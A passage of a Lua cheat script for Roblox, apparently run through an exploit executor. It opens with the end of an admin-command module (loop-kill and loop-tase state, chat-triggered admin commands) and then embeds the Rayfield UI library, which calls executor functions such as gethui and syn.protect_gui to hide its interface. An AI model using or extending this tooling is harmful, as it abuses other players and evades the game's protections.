		end
	end)()

	function CheckPermissions(Player)
		Player.Chatted:Connect(function(Message)
			if Admin[Player.UserId] then
				AdminPlayerChatted(Message, Player)
			end
		end)
	end

	game.Players.PlayerRemoving:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Rage Quit",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Rage Quit")
		end
	end)

	game.Players.PlayerAdded:Connect(function(Player)
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Joined",
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
		if States.ChatNotify then
			Chat(Player.DisplayName.." Joined The Server")
		end
		CheckPermissions(Player)
		CopyChat(Player)
		Died(Player)
		PlayerPickUp(Player)
	end)

	for i,v in pairs(game.Players:GetPlayers()) do
		if v ~= game.Players.LocalPlayer then
			CheckPermissions(v)
			CopyChat(v)
			Died(v)
			PlayerPickUp(v)
		end
	end

	game.Players.LocalPlayer.CharacterAdded:Connect(function()
		States.CAN = false
	end)

	FindCmd.Changed:Connect(function()
		if FindCmd.Text ~= "" then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					if not string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = Background
						v.Visible = false
					end
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					if string.lower(v.Text):match(string.lower(FindCmd.Text)) then
						v.Parent = CmdHandler
						v.Visible = true
					end
				end
			end
		elseif FindCmd.Text == "" and (#CmdHandler:GetChildren()-1) ~= #Cmd  then
			for i,v in pairs(CmdHandler:GetChildren()) do
				if v:IsA("TextButton") then
					v:Destroy()
				end
			end
			for i,v in pairs(Background:GetChildren()) do
				if v.Name == "COMMANDS" then
					v:Destroy()
				end
			end
			for i = 1,#Cmd do
				local clone = CmdText:Clone()
				clone.Text = Cmd[i].Text
				clone.Name = "COMMANDS"
				local Ins = Instance.new("StringValue", clone)
				Ins.Name = "Title"
				Ins.Value = Cmd[i].Title
				local Ins2 = Instance.new("StringValue", clone)
				Ins2.Name = "TopbarName"
				Ins2.Value = Cmd[i].Text:split(" ")[1]
				clone.Parent = CmdHandler
				clone.MouseButton1Click:Connect(function()
					Execute:CaptureFocus()
					Execute.Text = clone.Text:split(" ")[1]
					Execute.CursorPosition = #Execute.Text + 1
				end)
			end
		end
	end)

	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(Key)
		if Key == Prefix then
			if Prefix ~= "/" then
				Execute:CaptureFocus()
			end
		end
	end)

	Execute.FocusLost:Connect(function(FocusLost)
		if FocusLost then
			if Execute.Text:sub(1,#Prefix) ~= Prefix then
				PlayerChatted(Prefix..Execute.Text)
			else
				PlayerChatted(Execute.Text)
			end
		end
	end)

	_G.DisableScript = function()
		pcall(function()
			CmdGui:Destroy()
			States = {}
			LoopKill = {}
			LoopTase = {}
			Admin = {}
			ScriptDisabled = true
			for i,v in pairs(game.Lighting:GetChildren()) do
				v.Parent = workspace
			end
		end)
	end
end

function mod:LoadBF()

   --[[

Rayfield Interface Suite
by Sirius

shlex | Designing + Programming
iRay  | Programming

]]



	local Release = "Beta 8"
	local NotificationDuration = 6.5
	local RayfieldFolder = "Rayfield"
	local ConfigurationFolder = RayfieldFolder.."/Configurations"
	local ConfigurationExtension = ".rfld"



	local RayfieldLibrary = {
		Flags = {},
		Theme = {
			Default = {
				TextFont = "Default", -- Default will use the various font faces used across Rayfield
				TextColor = Color3.fromRGB(240, 240, 240),

				Background = Color3.fromRGB(25, 25, 25),
				Topbar = Color3.fromRGB(34, 34, 34),
				Shadow = Color3.fromRGB(20, 20, 20),

				NotificationBackground = Color3.fromRGB(20, 20, 20),
				NotificationActionsBackground = Color3.fromRGB(230, 230, 230),

				TabBackground = Color3.fromRGB(80, 80, 80),
				TabStroke = Color3.fromRGB(85, 85, 85),
				TabBackgroundSelected = Color3.fromRGB(210, 210, 210),
				TabTextColor = Color3.fromRGB(240, 240, 240),
				SelectedTabTextColor = Color3.fromRGB(50, 50, 50),

				ElementBackground = Color3.fromRGB(35, 35, 35),
				ElementBackgroundHover = Color3.fromRGB(40, 40, 40),
				SecondaryElementBackground = Color3.fromRGB(25, 25, 25), -- For labels and paragraphs
				ElementStroke = Color3.fromRGB(50, 50, 50),
				SecondaryElementStroke = Color3.fromRGB(40, 40, 40), -- For labels and paragraphs

				SliderBackground = Color3.fromRGB(43, 105, 159),
				SliderProgress = Color3.fromRGB(43, 105, 159),
				SliderStroke = Color3.fromRGB(48, 119, 177),

				ToggleBackground = Color3.fromRGB(30, 30, 30),
				ToggleEnabled = Color3.fromRGB(0, 146, 214),
				ToggleDisabled = Color3.fromRGB(100, 100, 100),
				ToggleEnabledStroke = Color3.fromRGB(0, 170, 255),
				ToggleDisabledStroke = Color3.fromRGB(125, 125, 125),
				ToggleEnabledOuterStroke = Color3.fromRGB(100, 100, 100),
				ToggleDisabledOuterStroke = Color3.fromRGB(65, 65, 65),

				InputBackground = Color3.fromRGB(30, 30, 30),
				InputStroke = Color3.fromRGB(65, 65, 65),
				PlaceholderColor = Color3.fromRGB(178, 178, 178)
			},
			Light = {
				TextFont = "Gotham", -- Default will use the various font faces used across Rayfield
				TextColor = Color3.fromRGB(50, 50, 50), -- i need to make all text 240, 240, 240 and base gray on transparency not color to do this

				Background = Color3.fromRGB(255, 255, 255),
				Topbar = Color3.fromRGB(217, 217, 217),
				Shadow = Color3.fromRGB(223, 223, 223),

				NotificationBackground = Color3.fromRGB(20, 20, 20),
				NotificationActionsBackground = Color3.fromRGB(230, 230, 230),

				TabBackground = Color3.fromRGB(220, 220, 220),
				TabStroke = Color3.fromRGB(112, 112, 112),
				TabBackgroundSelected = Color3.fromRGB(0, 142, 208),
				TabTextColor = Color3.fromRGB(240, 240, 240),
				SelectedTabTextColor = Color3.fromRGB(50, 50, 50),

				ElementBackground = Color3.fromRGB(198, 198, 198),
				ElementBackgroundHover = Color3.fromRGB(230, 230, 230),
				SecondaryElementBackground = Color3.fromRGB(136, 136, 136), -- For labels and paragraphs
				ElementStroke = Color3.fromRGB(180, 199, 97),
				SecondaryElementStroke = Color3.fromRGB(40, 40, 40), -- For labels and paragraphs

				SliderBackground = Color3.fromRGB(31, 159, 71),
				SliderProgress = Color3.fromRGB(31, 159, 71),
				SliderStroke = Color3.fromRGB(42, 216, 94),

				ToggleBackground = Color3.fromRGB(170, 203, 60),
				ToggleEnabled = Color3.fromRGB(32, 214, 29),
				ToggleDisabled = Color3.fromRGB(100, 22, 23),
				ToggleEnabledStroke = Color3.fromRGB(17, 255, 0),
				ToggleDisabledStroke = Color3.fromRGB(65, 8, 8),
				ToggleEnabledOuterStroke = Color3.fromRGB(0, 170, 0),
				ToggleDisabledOuterStroke = Color3.fromRGB(170, 0, 0),

				InputBackground = Color3.fromRGB(31, 159, 71),
				InputStroke = Color3.fromRGB(19, 65, 31),
				PlaceholderColor = Color3.fromRGB(178, 178, 178)
			}
		}
	}



	-- Services

	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local HttpService = game:GetService("HttpService")
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local CoreGui = Players.LocalPlayer.StarterGui

	-- Interface Management
	local Rayfield = game:GetObjects("rbxassetid://10804731440")[1]

	Rayfield.Enabled = false


	if gethui then
		Rayfield.Parent = gethui()
	elseif syn.protect_gui then 
		syn.protect_gui(Rayfield)
		Rayfield.Parent = CoreGui
	elseif CoreGui:FindFirstChild("RobloxGui") then
		Rayfield.Parent = CoreGui:FindFirstChild("RobloxGui")
	else
		Rayfield.Parent = CoreGui
	end

	if gethui then
		for _, Interface in ipairs(gethui():GetChildren()) do
			if Interface.Name == Rayfield.Name and Interface ~= Rayfield then
				Interface.Enabled = false
				Interface.Name = "Rayfield-Old"
			end
		end
	else
		for _, Interface in ipairs(CoreGui:GetChildren()) do
			if Interface.Name == Rayfield.Name and Interface ~= Rayfield then
				Interface.Enabled = false
				Interface.Name = "Rayfield-Old"
			end
		end
	end

	-- Object Variables

	local Camera = workspace.CurrentCamera
	local Main = Rayfield.Main
	local Topbar = Main.Topbar
	local Elements = Main.Elements
	local LoadingFrame = Main.LoadingFrame
	local TabList = Main.TabList

	Rayfield.DisplayOrder = 100
	LoadingFrame.Version.Text = Release


	-- Variables

	local request = http_request
	local CFileName = nil
	local CEnabled = false
	local Minimised = false
	local Hidden = false
	local Debounce = false
	local Notifications = Rayfield.Notifications

	local SelectedTheme = RayfieldLibrary.Theme.Default

	function ChangeTheme(ThemeName)
		SelectedTheme = RayfieldLibrary.Theme[ThemeName]
		for _, obj in ipairs(Rayfield:GetDescendants()) do
			if obj.ClassName == "TextLabel" or obj.ClassName == "TextBox" or obj.ClassName == "TextButton" then
				if SelectedTheme.TextFont ~= "Default" then 
					obj.TextColor3 = SelectedTheme.TextColor
					obj.Font = SelectedTheme.TextFont
				end
			end
		end

		Rayfield.Main.BackgroundColor3 = SelectedTheme.Background
		Rayfield.Main.Topbar.BackgroundColor3 = SelectedTheme.Topbar
		Rayfield.Main.Topbar.CornerRepair.BackgroundColor3 = SelectedTheme.Topbar
		Rayfield.Main.Shadow.Image.ImageColor3 = SelectedTheme.Shadow

		Rayfield.Main.Topbar.ChangeSize.ImageColor3 = SelectedTheme.TextColor
		Rayfield.Main.Topbar.Hide.ImageColor3 = SelectedTheme.TextColor
		Rayfield.Main.Topbar.Theme.ImageColor3 = SelectedTheme.TextColor

		for _, TabPage in ipairs(Elements:GetChildren()) do
			for _, Element in ipairs(TabPage:GetChildren()) do
				if Element.ClassName == "Frame" and Element.Name ~= "Placeholder" and Element.Name ~= "SectionSpacing" and Element.Name ~= "SectionTitle"  then
					Element.BackgroundColor3 = SelectedTheme.ElementBackground
					Element.UIStroke.Color = SelectedTheme.ElementStroke
				end
			end
		end

	end

	local function AddDraggingFunctionality(DragPoint, Main)
		pcall(function()
			local Dragging, DragInput, MousePos, FramePos = false
			DragPoint.InputBegan:Connect(function(Input)
				if Input.UserInputType == Enum.UserInputType.MouseButton1 then
					Dragging = true
					MousePos = Input.Position
					FramePos = Main.Position

					Input.Changed:Connect(function()
						if Input.UserInputState == Enum.UserInputState.End then
							Dragging = false
						end
					end)
				end
			end)
			DragPoint.InputChanged:Connect(function(Input)
				if Input.UserInputType == Enum.UserInputType.MouseMovement then
					DragInput = Input
				end
			end)
			UserInputService.InputChanged:Connect(function(Input)
				if Input == DragInput and Dragging then
					local Delta = Input.Position - MousePos
					TweenService:Create(Main, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Position  = UDim2.new(FramePos.X.Scale,FramePos.X.Offset + Delta.X, FramePos.Y.Scale, FramePos.Y.Offset + Delta.Y)}):Play()
				end
			end)
		end)
	end   

	local function PackColor(Color)
		return {R = Color.R * 255, G = Color.G * 255, B = Color.B * 255}
	end    

	local function UnpackColor(Color)
		return Color3.fromRGB(Color.R, Color.G, Color.B)
	end

	local function LoadConfiguration(Configuration)
		local Data = HttpService:JSONDecode(Configuration)
		for FlagName, FlagValue in next, Data do
			if RayfieldLibrary.Flags[FlagName] then
				spawn(function() 
					if RayfieldLibrary.Flags[FlagName].Type == "ColorPicker" then
						RayfieldLibrary.Flags[FlagName]:Set(UnpackColor(FlagValue))
					else
						if RayfieldLibrary.Flags[FlagName].CurrentValue or RayfieldLibrary.Flags[FlagName].CurrentKeybind or RayfieldLibrary.Flags[FlagName].CurrentOption or RayfieldLibrary.Flags[FlagName].Color ~= FlagValue then RayfieldLibrary.Flags[FlagName]:Set(FlagValue) end
					end    
				end)
			else
				RayfieldLibrary:Notify({Title = "Flag Error", Content = "Rayfield was unable to find '"..FlagName.. "'' in the current script"})
			end
		end
	end

	local function SaveConfiguration()
		if not CEnabled then return end
		local Data = {}
		for i,v in pairs(RayfieldLibrary.Flags) do
			if v.Type == "ColorPicker" then
				Data[i] = PackColor(v.Color)
			else
				Data[i] = v.CurrentValue or v.CurrentKeybind or v.CurrentOption or v.Color
			end
		end	
		writefile(ConfigurationFolder .. "/" .. CFileName .. ConfigurationExtension, tostring(HttpService:JSONEncode(Data)))
	end

	local neon = (function() -- Open sourced neon module
		local module = {}

		do
			local function IsNotNaN(x)
				return x == x
			end
			local continued = IsNotNaN(Camera:ScreenPointToRay(0,0).Origin.x)
			while not continued do
				RunService.RenderStepped:wait()
				continued = IsNotNaN(Camera:ScreenPointToRay(0,0).Origin.x)
			end
		end
		local RootParent = Camera
		if _G.SecureMode == nil then
			RootParent = Camera
		else
			if not _G.SecureMode then
				RootParent = Camera
			else 
				RootParent = nil
			end
		end


		local binds = {}
		local root = Instance.new('Folder', RootParent)
		root.Name = 'neon'


		local GenUid; do
			local id = 0
			function GenUid()
				id = id + 1
				return 'neon::'..tostring(id)
			end
		end

		local DrawQuad; do
			local acos, max, pi, sqrt = math.acos, math.max, math.pi, math.sqrt
			local sz = 0.2

			function DrawTriangle(v1, v2, v3, p0, p1)
				local s1 = (v1 - v2).magnitude
				local s2 = (v2 - v3).magnitude
				local s3 = (v3 - v1).magnitude
				local smax = max(s1, s2, s3)
				local A, B, C
				if s1 == smax then
					A, B, C = v1, v2, v3
				elseif s2 == smax then
					A, B, C = v2, v3, v1
				elseif s3 == smax then
					A, B, C = v3, v1, v2
				end

				local para = ( (B-A).x*(C-A).x + (B-A).y*(C-A).y + (B-A).z*(C-A).z ) / (A-B).magnitude
				local perp = sqrt((C-A).magnitude^2 - para*para)
				local dif_para = (A - B).magnitude - para

				local st = CFrame.new(B, A)
				local za = CFrame.Angles(pi/2,0,0)

				local cf0 = st

				local Top_Look = (cf0 * za).lookVector
				local Mid_Point = A + CFrame.new(A, B).LookVector * para
				local Needed_Look = CFrame.new(Mid_Point, C).LookVector
				local dot = Top_Look.x*Needed_Look.x + Top_Look.y*Needed_Look.y + Top_Look.z*Needed_Look.z

				local ac = CFrame.Angles(0, 0, acos(dot))

				cf0 = cf0 * ac
				if ((cf0 * za).lookVector - Needed_Look).magnitude > 0.01 then
					cf0 = cf0 * CFrame.Angles(0, 0, -2*acos(dot))
				end
				cf0 = cf0 * CFrame.new(0, perp/2, -(dif_para + para/2))

				local cf1 = st * ac * CFrame.Angles(0, pi, 0)
				if ((cf1 * za).lookVector - Needed_Look).magnitude > 0.01 then
					cf1 = cf1 * CFrame.Angles(0, 0, 2*acos(dot))
				end
				cf1 = cf1 * CFrame.new(0, perp/2, dif_para/2)

				if not p0 then
					p0 = Instance.new('Part')
					p0.FormFactor = 'Custom'
					p0.TopSurface = 0
					p0.BottomSurface = 0
					p0.Anchored = true
					p0.CanCollide = false
					p0.Material = 'Glass'
					p0.Size = Vector3.new(sz, sz, sz)
					local mesh = Instance.new('SpecialMesh', p0)
					mesh.MeshType = 2
					mesh.Name = 'WedgeMesh'
				end
				p0.WedgeMesh.Scale = Vector3.new(0, perp/sz, para/sz)
				p0.CFrame = cf0

				if not p1 then
					p1 = p0:clone()
				end
				p1.WedgeMesh.Scale = Vector3.new(0, perp/sz, dif_para/sz)
				p1.CFrame = cf1

				return p0, p1
			end

			function DrawQuad(v1, v2, v3, v4, parts)
				parts[1], parts[2] = DrawTriangle(v1, v2, v3, parts[1], parts[2])
				parts[3], parts[4] = DrawTriangle(v3, v2, v4, parts[3], parts[4])
			end
		end

		function module:BindFrame(frame, properties)
			if RootParent == nil then return end
			if binds[frame] then
				return binds[frame].parts
			end

			local uid = GenUid()
			local parts = {}
			local f = Instance.new('Folder', root)
			f.Name = frame.Name

			local parents = {}
			do
				local function add(child)
					if child:IsA'GuiObject' then
						parents[#parents + 1] = child
						add(child.Parent)
					end
				end
				add(frame)
			end

			local function UpdateOrientation(fetchProps)
				local zIndex = 1 - 0.05*frame.ZIndex
				local tl, br = frame.AbsolutePosition, frame.AbsolutePosition + frame.AbsoluteSize
				local tr, bl = Vector2.new(br.x, tl.y), Vector2.new(tl.x, br.y)
				do
					local rot = 0;
					for _, v in ipairs(parents) do
						rot = rot + v.Rotation
					end
					if rot ~= 0 and rot%180 ~= 0 then
						local mid = tl:lerp(br, 0.5)
						local s, c = math.sin(math.rad(rot)), math.cos(math.rad(rot))
						local vec = tl
						tl = Vector2.new(c*(tl.x - mid.x) - s*(tl.y - mid.y), s*(tl.x - mid.x) + c*(tl.y - mid.y)) + mid
						tr = Vector2.new(c*(tr.x - mid.x) - s*(tr.y - mid.y), s*(tr.x - mid.x) + c*(tr.y - mid.y)) + mid
						bl = Vector2.new(c*(bl.x - mid.x) - s*(bl.y - mid.y), s*(bl.x - mid.x) + c*(bl.y - mid.y)) + mid
						br = Vector2.new(c*(br.x - mid.x) - s*(br.y - mid.y), s*(br.x - mid.x) + c*(br.y - mid.y)) + mid
					end
				end
				DrawQuad(
					Camera:ScreenPointToRay(tl.x, tl.y, zIndex).Origin, 
					Camera:ScreenPointToRay(tr.x, tr.y, zIndex).Origin, 
					Camera:ScreenPointToRay(bl.x, bl.y, zIndex).Origin, 
					Camera:ScreenPointToRay(br.x, br.y, zIndex).Origin, 
					parts
				)
				if fetchProps then
					for _, pt in pairs(parts) do
						pt.Parent = f
					end
					for propName, propValue in pairs(properties) do
						for _, pt in pairs(parts) do
							pt[propName] = propValue
						end
					end
				end
			end

			UpdateOrientation(true)
			RunService:BindToRenderStep(uid, 2000, UpdateOrientation)

			binds[frame] = {
				uid = uid;
				parts = parts;
			}
			return binds[frame].parts
		end

		function module:Modify(frame, properties)
			local parts = module:GetBoundParts(frame)
			if parts then
				for propName, propValue in pairs(properties) do
					for _, pt in pairs(parts) do
						pt[propName] = propValue
					end
				end
			end
		end

		function module:UnbindFrame(frame)
			if RootParent == nil then return end
			local cb = binds[frame]
			if cb then
				RunService:UnbindFromRenderStep(cb.uid)
				for _, v in pairs(cb.parts) do
					v:Destroy()
				end
				binds[frame] = nil
			end
		end

		function module:HasBinding(frame)
			return binds[frame] ~= nil
		end

		function module:GetBoundParts(frame)
			return binds[frame] and binds[frame].parts
		end


		return module

	end)()

	function RayfieldLibrary:Notify(NotificationSettings)
		spawn(function()
			local ActionCompleted = true
			local Notification = Notifications.Template:Clone()
			Notification.Parent = Notifications
			Notification.Name = NotificationSettings.Title or "Unknown Title"
			Notification.Visible = true

			local blurlight = nil
			if not _G.SecureMode then
				blurlight = Instance.new("DepthOfFieldEffect",game:GetService("Lighting"))
				blurlight.Enabled = true
				blurlight.FarIntensity = 0
				blurlight.FocusDistance = 51.6
				blurlight.InFocusRadius = 50
				blurlight.NearIntensity = 1
				game:GetService("Debris"):AddItem(script,0)
			end

			Notification.Actions.Template.Visible = false

			if NotificationSettings.Actions then
				for _, Action in pairs(NotificationSettings.Actions) do
					ActionCompleted = false
					local NewAction = Notification.Actions.Template:Clone()
					NewAction.BackgroundColor3 = SelectedTheme.NotificationActionsBackground
					if SelectedTheme ~= RayfieldLibrary.Theme.Default then
						NewAction.TextColor3 = SelectedTheme.TextColor
					end
					NewAction.Name = Action.Name
					NewAction.Visible = true
					NewAction.Parent = Notification.Actions
					NewAction.Text = Action.Name
					NewAction.BackgroundTransparency = 1
					NewAction.TextTransparency = 1
					NewAction.Size = UDim2.new(0, NewAction.TextBounds.X + 27, 0, 36)

					NewAction.MouseButton1Click:Connect(function()
						local Success, Response = pcall(Action.Callback)
						if not Success then
							print("Rayfield | Action: "..Action.Name.." Callback Error " ..tostring(Response))
						end
						ActionCompleted = true
					end)
				end
			end
			Notification.BackgroundColor3 = SelectedTheme.Background
			Notification.Title.Text = NotificationSettings.Title or "Unknown"
			Notification.Title.TextTransparency = 1
			Notification.Title.TextColor3 = SelectedTheme.TextColor
			Notification.Description.Text = NotificationSettings.Content or "Unknown"
			Notification.Description.TextTransparency = 1
			Notification.Description.TextColor3 = SelectedTheme.TextColor
			Notification.Icon.ImageColor3 = SelectedTheme.TextColor
			if NotificationSettings.Image then
				Notification.Icon.Image = "rbxassetid://"..tostring(NotificationSettings.Image) 
			else
				Notification.Icon.Image = "rbxassetid://3944680095"
			end

			Notification.Icon.ImageTransparency = 1

			Notification.Parent = Notifications
			Notification.Size = UDim2.new(0, 260, 0, 80)
			Notification.BackgroundTransparency = 1

			TweenService:Create(Notification, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 295, 0, 91)}):Play()
			TweenService:Create(Notification, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.1}):Play()
			Notification:TweenPosition(UDim2.new(0.5,0,0.915,0),'Out','Quint',0.8,true)

			wait(0.3)
			TweenService:Create(Notification.Icon, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {ImageTransparency = 0}):Play()
			TweenService:Create(Notification.Title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
			TweenService:Create(Notification.Description, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.2}):Play()
			wait(0.2)



			-- Requires Graphics Level 8-10
			if _G.SecureMode == nil then
				TweenService:Create(Notification, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.4}):Play()
			else
				if not _G.SecureMode then
					TweenService:Create(Notification, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.4}):Play()
				else 
					TweenService:Create(Notification, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
				end
			end

			if Rayfield.Name == "Rayfield" then
				neon:BindFrame(Notification.BlurModule, {
					Transparency = 0.98;
					BrickColor = BrickColor.new("Institutional white");
				})
			end

			if not NotificationSettings.Actions then
				wait(NotificationSettings.Duration or NotificationDuration - 0.5)
			else
				wait(0.8)
				TweenService:Create(Notification, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 295, 0, 132)}):Play()
				wait(0.3)
				for _, Action in ipairs(Notification.Actions:GetChildren()) do
					if Action.ClassName == "TextButton" and Action.Name ~= "Template" then
						TweenService:Create(Action, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.2}):Play()
						TweenService:Create(Action, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
						wait(0.05)
					end
				end
			end

			repeat wait(0.001) until ActionCompleted

			for _, Action in ipairs(Notification.Actions:GetChildren()) do
				if Action.ClassName == "TextButton" and Action.Name ~= "Template" then
					TweenService:Create(Action, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
					TweenService:Create(Action, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
				end
			end

			TweenService:Create(Notification.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Position = UDim2.new(0.47, 0,0.234, 0)}):Play()
			TweenService:Create(Notification.Description, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {Position = UDim2.new(0.528, 0,0.637, 0)}):Play()
			TweenService:Create(Notification, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 280, 0, 83)}):Play()
			TweenService:Create(Notification.Icon, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
			TweenService:Create(Notification, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.6}):Play()

			wait(0.3)
			TweenService:Create(Notification.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.4}):Play()
			TweenService:Create(Notification.Description, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.5}):Play()
			wait(0.4)
			TweenService:Create(Notification, TweenInfo.new(0.9, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 260, 0, 0)}):Play()
			TweenService:Create(Notification, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
			TweenService:Create(Notification.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
			TweenService:Create(Notification.Description, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
			wait(0.2)
			if not _G.SecureMode then
				neon:UnbindFrame(Notification.BlurModule)
				blurlight:Destroy()
			end
			wait(0.9)
			Notification:Destroy()
		end)
	end

	function Hide()
		Debounce = true
		RayfieldLibrary:Notify({Title = "Interface Hidden", Content = "The interface has been hidden, you can unhide the interface by tapping N", Duration = 7})
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 470, 0, 400)}):Play()
		TweenService:Create(Main.Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 470, 0, 45)}):Play()
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Main.Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Main.Topbar.Divider, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Main.Topbar.CornerRepair, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
		TweenService:Create(Main.Topbar.Title, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
		TweenService:Create(Topbar.UIStroke, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
		for _, TopbarButton in ipairs(Topbar:GetChildren()) do
			if TopbarButton.ClassName == "ImageButton" then
				TweenService:Create(TopbarButton, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
			end
		end
		for _, tabbtn in ipairs(TabList:GetChildren()) do
			if tabbtn.ClassName == "Frame" and tabbtn.Name ~= "Placeholder" then
				TweenService:Create(tabbtn, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
				TweenService:Create(tabbtn.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
				TweenService:Create(tabbtn.Image, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
				TweenService:Create(tabbtn.Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
				TweenService:Create(tabbtn.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
			end
		end
		for _, tab in ipairs(Elements:GetChildren()) do
			if tab.Name ~= "Template" and tab.ClassName == "ScrollingFrame" and tab.Name ~= "Placeholder" then
				for _, element in ipairs(tab:GetChildren()) do
					if element.ClassName == "Frame" then
						if element.Name ~= "SectionSpacing" and element.Name ~= "Placeholder" then
							if element.Name == "SectionTitle" then
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							else
								TweenService:Create(element, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
								TweenService:Create(element.UIStroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {Transparency = 1}):Play()
								TweenService:Create(element.Title, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {TextTransparency = 1}):Play()
							end
							for _, child in ipairs(element:GetChildren()) do
								if child.ClassName == "Frame" or child.ClassName == "TextLabel" or child.ClassName == "TextBox" or child.ClassName == "ImageButton" or child.ClassName == "ImageLabel" then
									child.Visible = false
								end
							end
						end
					end
				end
			end
		end
		wait(0.5)
		Main.Visible = false
		Debounce = false
	end

	function Unhide()
		Debounce = true
		Main.Position = UDim2.new(0.5, 0, 0.5, 0)
		Main.Visible = true
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 475)}):Play()
		TweenService:Create(Main.Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {Size = UDim2.new(0, 500, 0, 45)}):Play()
		TweenService:Create(Main.Shadow.Image, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.4}):Play()
		TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main.Topbar, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main.Topbar.Divider, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main.Topbar.CornerRepair, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {BackgroundTransparency = 0}):Play()
		TweenService:Create(Main.Topbar.Title, TweenInfo.new(0.5, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
		if Minimised then
			spawn(Maximise)
		end
		for _, TopbarButton in ipairs(Topbar:GetChildren()) do
			if TopbarButton.ClassName == "ImageButton" then
				TweenService:Create(TopbarButton, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {ImageTransparency = 0.8}):Play()
			end
		end
		for _, tabbtn in ipairs(TabList:GetChildren()) do
			if tabbtn.ClassName == "Frame" and tabbtn.Name ~= "Placeholder" then
				if tostring(Elements.UIPageLayout.CurrentPage) == tabbtn.Title.Text then
